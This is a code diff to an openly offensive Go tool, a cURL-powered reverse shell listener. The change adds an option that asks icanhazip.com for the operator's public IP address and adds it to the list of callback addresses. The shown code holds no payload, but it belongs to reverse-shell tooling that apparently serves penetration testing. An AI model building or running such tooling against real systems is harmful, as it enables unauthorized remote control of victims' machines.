@@ -6,7 +6,7 @@ package main
  * Even worse reverse shell, powered by cURL
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240329
+ * Last Modified 20240402
  */
 
 import (
@@ -21,6 +21,7 @@ import (
 
 	"github.com/magisterquis/curlrevshell/internal/hsrv"
 	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
+	"github.com/magisterquis/curlrevshell/lib/ezicanhazip"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 )
 
@@ -76,6 +77,11 @@ func rmain() int {
 			false,
 			"Also print callback one-liners with IPv6 addresses",
 		)
+		useIcanhazip = flag.Bool(
+			"icanhazip",
+			false,
+			"Query icanhazip.com for a callback address",
+		)
 	)
 	flag.StringVar(
 		&Prompt,
@@ -124,6 +130,7 @@ Options:
 		ich = make(chan string, 1024)
 		och = make(chan opshell.CLine, 1024)
 	)
+
 	/* Fancypants shell. */
 	shell, cleanup, err := opshell.New(
 		ich,
@@ -136,6 +143,22 @@ Options:
 		log.Printf("Error setting up shell: %s", err)
 	}
 	defer cleanup()
+
+	/* Ask icanhazip for our IP address. */
+	if *useIcanhazip {
+		a, err := ezicanhazip.IPv4()
+		if nil != err {
+			shell.Logf(
+				opshell.ColorRed,
+				false,
+				"Error getting addresses from "+
+					"icanhazip.com: %s",
+				err,
+			)
+			return 2
+		}
+		cbAddrs = append(cbAddrs, a.String())
+	}
 
 	/* HTTPS Server */
 	svr, cleanup, err := hsrv.New(
